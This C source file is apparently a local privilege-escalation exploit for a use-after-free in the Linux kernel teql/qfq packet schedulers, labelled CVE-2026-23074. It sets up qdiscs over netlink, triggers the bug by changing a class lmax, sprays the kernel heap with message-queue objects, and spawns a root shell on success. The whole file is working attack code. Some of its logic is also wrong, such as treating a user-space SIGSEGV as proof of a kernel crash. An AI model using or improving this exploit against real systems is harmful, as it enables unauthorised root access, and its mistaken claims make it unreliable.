/*
 * CVE-2026-23074 teql UAF Exploit - FINAL DEBUG
 * Dengan verifikasi vulnerability
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/msg.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_sched.h>
#include <net/if.h>
#include <pthread.h>
#include <stdint.h>

/* =============================================
 *  DEFINES
 * ============================================= */
#define DUMMY_IFACE "dummy0"
#define CLASS_A 0x10001
#define CLASS_B 0x10002
#define DELAY_SEC 6

#ifndef TCA_QFQ_WEIGHT
#define TCA_QFQ_WEIGHT 1
#endif
#ifndef TCA_QFQ_LMAX
#define TCA_QFQ_LMAX 2
#endif

struct tc_qfq_qopt {
    unsigned int weight;
    unsigned int max_pkt_len;
};

static int nl_fd = -1;
static uint32_t seq = 0;
static volatile int got_root = 0;
static int crash_detected = 0;

/* =============================================
 *  UTILITY
 * ============================================= */
static void die(const char *msg) { perror(msg); exit(1); }

static void exec_shell(void) {
    if (getuid() == 0) {
        puts("\n[!!!] ROOT SHELL!");
        setuid(0);
        execl("/bin/bash", "bash", NULL);
        execl("/bin/sh", "sh", NULL);
    }
}

/* Detect if kernel crashes */
static void sigsegv_handler(int sig) {
    (void)sig;
    crash_detected = 1;
    printf("[!] KERNEL CRASH DETECTED (SIGSEGV) - Vulnerability EXISTS!\n");
}

static int netlink_send_recv(struct nlmsghdr *nlh) {
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    struct iovec iov = { nlh, nlh->nlmsg_len };
    struct msghdr msg = { &sa, sizeof(sa), &iov, 1, NULL, 0, 0 };
    if (sendmsg(nl_fd, &msg, 0) < 0) return -1;
    char buf[8192];
    struct iovec r_iov = { buf, sizeof(buf) };
    struct msghdr r_msg = { &sa, sizeof(sa), &r_iov, 1, NULL, 0, 0 };
    return recvmsg(nl_fd, &r_msg, 0);
}

/* =============================================
 *  QDISC SETUP
 * ============================================= */
static void setup_qdiscs(void) {
    char buf[4096];
    struct nlmsghdr *nlh;
    struct tcmsg *tcm;
    struct rtattr *rta, *nest;
    struct tc_qfq_qopt opt;
    struct { struct tc_netem_qopt n; } netem_opt = { .n = { .limit = 1000, .latency = DELAY_SEC * 1000 } };
    
    /* Root qfq */
    memset(buf, 0, sizeof(buf));
    nlh = (struct nlmsghdr *)buf;
    tcm = (struct tcmsg *)(nlh + 1);
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    nlh->nlmsg_type = RTM_NEWQDISC;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
    nlh->nlmsg_seq = ++seq;
    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_ifindex = if_nametoindex(DUMMY_IFACE);
    tcm->tcm_parent = TC_H_ROOT;
    tcm->tcm_handle = 0x10000;
    rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = TCA_KIND;
    rta->rta_len = RTA_LENGTH(4);
    memcpy(RTA_DATA(rta), "qfq", 4);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
    netlink_send_recv(nlh);
    printf("[+] Root qfq added\n");
    usleep(100000);
    
    /* Class A with netem */
    memset(buf, 0, sizeof(buf));
    nlh = (struct nlmsghdr *)buf;
    tcm = (struct tcmsg *)(nlh + 1);
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    nlh->nlmsg_type = RTM_NEWTCLASS;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
    nlh->nlmsg_seq = ++seq;
    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_ifindex = if_nametoindex(DUMMY_IFACE);
    tcm->tcm_parent = 0x10000;
    tcm->tcm_handle = CLASS_A;
    rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = TCA_KIND;
    rta->rta_len = RTA_LENGTH(4);
    memcpy(RTA_DATA(rta), "qfq", 4);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
    rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = TCA_OPTIONS;
    rta->rta_len = RTA_LENGTH(0);
    nest = rta;
    opt.weight = 15;
    opt.max_pkt_len = 16384;
    rta = (struct rtattr *)((char *)nest + RTA_ALIGN(nest->rta_len));
    rta->rta_type = TCA_QFQ_WEIGHT;
    rta->rta_len = RTA_LENGTH(sizeof(opt.weight));
    memcpy(RTA_DATA(rta), &opt.weight, sizeof(opt.weight));
    nest->rta_len = RTA_ALIGN(nest->rta_len) + RTA_ALIGN(rta->rta_len);
    rta = (struct rtattr *)((char *)nest + RTA_ALIGN(nest->rta_len));
    rta->rta_type = TCA_QFQ_LMAX;
    rta->rta_len = RTA_LENGTH(sizeof(opt.max_pkt_len));
    memcpy(RTA_DATA(rta), &opt.max_pkt_len, sizeof(opt.max_pkt_len));
    nest->rta_len = RTA_ALIGN(nest->rta_len) + RTA_ALIGN(rta->rta_len);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(nest->rta_len);
    netlink_send_recv(nlh);
    printf("[+] Class 0x%x added\n", CLASS_A);
    usleep(50000);
    
    /* Netem qdisc */
    memset(buf, 0, sizeof(buf));
    nlh = (struct nlmsghdr *)buf;
    tcm = (struct tcmsg *)(nlh + 1);
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    nlh->nlmsg_type = RTM_NEWQDISC;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
    nlh->nlmsg_seq = ++seq;
    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_ifindex = if_nametoindex(DUMMY_IFACE);
    tcm->tcm_parent = CLASS_A;
    tcm->tcm_handle = 2;
    rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = TCA_KIND;
    rta->rta_len = RTA_LENGTH(6);
    memcpy(RTA_DATA(rta), "netem", 6);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
    rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = TCA_OPTIONS;
    rta->rta_len = RTA_LENGTH(sizeof(netem_opt));
    memcpy(RTA_DATA(rta), &netem_opt, sizeof(netem_opt));
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
    netlink_send_recv(nlh);
    printf("[+] Netem qdisc added under 0x%x\n", CLASS_A);
    usleep(50000);
    
    /* Class B with teql */
    memset(buf, 0, sizeof(buf));
    nlh = (struct nlmsghdr *)buf;
    tcm = (struct tcmsg *)(nlh + 1);
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    nlh->nlmsg_type = RTM_NEWTCLASS;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
    nlh->nlmsg_seq = ++seq;
    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_ifindex = if_nametoindex(DUMMY_IFACE);
    tcm->tcm_parent = 0x10000;
    tcm->tcm_handle = CLASS_B;
    rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = TCA_KIND;
    rta->rta_len = RTA_LENGTH(4);
    memcpy(RTA_DATA(rta), "qfq", 4);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
    rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = TCA_OPTIONS;
    rta->rta_len = RTA_LENGTH(0);
    nest = rta;
    opt.weight = 1;
    opt.max_pkt_len = 1514;
    rta = (struct rtattr *)((char *)nest + RTA_ALIGN(nest->rta_len));
    rta->rta_type = TCA_QFQ_WEIGHT;
    rta->rta_len = RTA_LENGTH(sizeof(opt.weight));
    memcpy(RTA_DATA(rta), &opt.weight, sizeof(opt.weight));
    nest->rta_len = RTA_ALIGN(nest->rta_len) + RTA_ALIGN(rta->rta_len);
    rta = (struct rtattr *)((char *)nest + RTA_ALIGN(nest->rta_len));
    rta->rta_type = TCA_QFQ_LMAX;
    rta->rta_len = RTA_LENGTH(sizeof(opt.max_pkt_len));
    memcpy(RTA_DATA(rta), &opt.max_pkt_len, sizeof(opt.max_pkt_len));
    nest->rta_len = RTA_ALIGN(nest->rta_len) + RTA_ALIGN(rta->rta_len);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(nest->rta_len);
    netlink_send_recv(nlh);
    printf("[+] Class 0x%x added\n", CLASS_B);
    usleep(50000);
    
    /* Teql qdisc */
    memset(buf, 0, sizeof(buf));
    nlh = (struct nlmsghdr *)buf;
    tcm = (struct tcmsg *)(nlh + 1);
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    nlh->nlmsg_type = RTM_NEWQDISC;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
    nlh->nlmsg_seq = ++seq;
    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_ifindex = if_nametoindex(DUMMY_IFACE);
    tcm->tcm_parent = CLASS_B;
    tcm->tcm_handle = 3;
    rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = TCA_KIND;
    rta->rta_len = RTA_LENGTH(5);
    memcpy(RTA_DATA(rta), "teql", 5);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
    netlink_send_recv(nlh);
    printf("[+] Teql qdisc added under 0x%x (VULNERABLE)\n", CLASS_B);
}

/* Update lmax - trigger vulnerability */
static void update_lmax(uint32_t classid, uint32_t new_lmax) {
    char buf[4096];
    struct nlmsghdr *nlh;
    struct tcmsg *tcm;
    struct rtattr *rta, *nest;
    struct tc_qfq_qopt opt;
    
    memset(buf, 0, sizeof(buf));
    nlh = (struct nlmsghdr *)buf;
    tcm = (struct tcmsg *)(nlh + 1);
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    nlh->nlmsg_type = RTM_NEWTCLASS;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq = ++seq;
    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_ifindex = if_nametoindex(DUMMY_IFACE);
    tcm->tcm_parent = 0x10000;
    tcm->tcm_handle = classid;
    rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = TCA_KIND;
    rta->rta_len = RTA_LENGTH(4);
    memcpy(RTA_DATA(rta), "qfq", 4);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
    rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = TCA_OPTIONS;
    rta->rta_len = RTA_LENGTH(0);
    nest = rta;
    opt.weight = 1;
    opt.max_pkt_len = new_lmax;
    rta = (struct rtattr *)((char *)nest + RTA_ALIGN(nest->rta_len));
    rta->rta_type = TCA_QFQ_WEIGHT;
    rta->rta_len = RTA_LENGTH(sizeof(opt.weight));
    memcpy(RTA_DATA(rta), &opt.weight, sizeof(opt.weight));
    nest->rta_len = RTA_ALIGN(nest->rta_len) + RTA_ALIGN(rta->rta_len);
    rta = (struct rtattr *)((char *)nest + RTA_ALIGN(nest->rta_len));
    rta->rta_type = TCA_QFQ_LMAX;
    rta->rta_len = RTA_LENGTH(sizeof(opt.max_pkt_len));
    memcpy(RTA_DATA(rta), &opt.max_pkt_len, sizeof(opt.max_pkt_len));
    nest->rta_len = RTA_ALIGN(nest->rta_len) + RTA_ALIGN(rta->rta_len);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(nest->rta_len);
    
    printf("[!] Updating class 0x%x lmax %u -> %u\n", classid, 1514, new_lmax);
    netlink_send_recv(nlh);
}

static void send_packets(int count) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return;
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(9999);
    inet_pton(AF_INET, "192.0.2.1", &dst.sin_addr);
    char pkt[1500] = {0};
    for (int i = 0; i < count; i++) {
        sendto(s, pkt, sizeof(pkt), 0, (struct sockaddr *)&dst, sizeof(dst));
        usleep(1000);
    }
    close(s);
    printf("[+] Sent %d packets\n", count);
}

static void massive_spray(void) {
    struct { long mtype; char mtext[512]; } msg;
    msg.mtype = 1;
    memset(msg.mtext, 0x41, 512);
    
    printf("[*] Massive heap spray...\n");
    for (int i = 0; i < 500; i++) {
        int qid = msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
        if (qid >= 0) {
            for (int j = 0; j < 100; j++) {
                msgsnd(qid, &msg, 512 - sizeof(long), IPC_NOWAIT);
            }
        }
        if (i % 100 == 0) printf("    Spray progress: %d/500\n", i);
    }
    printf("[+] Spray completed\n");
}

int main(void) {
    signal(SIGSEGV, sigsegv_handler);
    
    printf("\n========================================\n");
    printf("CVE-2026-23074 teql UAF - FINAL TEST\n");
    printf("========================================\n");
    printf("[*] UID=%d\n", getuid());
    
    /* Setup */
    system("modprobe teql sch_netem sch_qfq dummy 2>/dev/null");
    system("ip link del dummy0 2>/dev/null");
    system("ip link add dummy0 type dummy");
    system("ip link set dummy0 up");
    
    nl_fd = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_ROUTE);
    if (nl_fd < 0) die("socket");
    
    setup_qdiscs();
    
    /* Create filters for traffic direction */
    system("tc filter add dev dummy0 parent 1:0 protocol ip prio 1 u32 match ip dport 9999 0xffff classid 0x10001 2>/dev/null");
    system("tc filter add dev dummy0 parent 1:0 protocol ip prio 2 u32 match ip dport 8888 0xffff classid 0x10002 2>/dev/null");
    
    printf("\n[*] Starting exploit sequence...\n\n");
    
    /* Step 1: Send packet to netem (will be delayed) */
    printf("[1] Sending packet to netem (delay %d seconds)...\n", DELAY_SEC);
    send_packets(1);
    
    sleep(1);
    
    /* Step 2: Send packets to teql */
    printf("[2] Sending packets to teql...\n");
    send_packets(10);
    
    sleep(1);
    
    /* Step 3: Update lmax - THIS SHOULD TRIGGER UAF */
    printf("[3] Updating lmax (triggering qfq_deact_rm_from_agg)...\n");
    update_lmax(CLASS_B, 9000);
    
    /* Step 4: Wait for delayed packet to return */
    printf("[4] Waiting %d seconds for delayed packet...\n", DELAY_SEC + 1);
    printf("    (If vulnerability exists, kernel should crash here)\n");
    
    for (int i = 0; i <= DELAY_SEC + 1; i++) {
        sleep(1);
        printf("    Waiting... %d/%d seconds\n", i, DELAY_SEC + 1);
        if (crash_detected) break;
    }
    
    /* Step 5: Heap spray */
    printf("[5] Heap spraying...\n");
    massive_spray();
    
    /* Step 6: Trigger again */
    printf("[6] Triggering dangling pointer...\n");
    send_packets(1);
    
    sleep(2);
    
    /* Check result */
    if (crash_detected) {
        printf("\n[!!!] VULNERABILITY CONFIRMED! Kernel crashed as expected.\n");
        printf("[!!!] However, successful privilege escalation requires SMEP/SMAP bypass.\n");
    } else if (getuid() == 0) {
        printf("\n[!!!] SUCCESS! Got root!\n");
        exec_shell();
    } else {
        printf("\n[-] No crash detected. Kernel is likely PATCHED.\n");
        printf("\nDiagnostic commands to run:\n");
        printf("  uname -a\n");
        printf("  dmesg | grep -i teql\n");
        printf("  cat /proc/version\n");
    }
    
    /* Cleanup */
    close(nl_fd);
    system("tc qdisc del dev dummy0 root 2>/dev/null");
    system("ip link del dummy0 2>/dev/null");
    
    return 0;
}
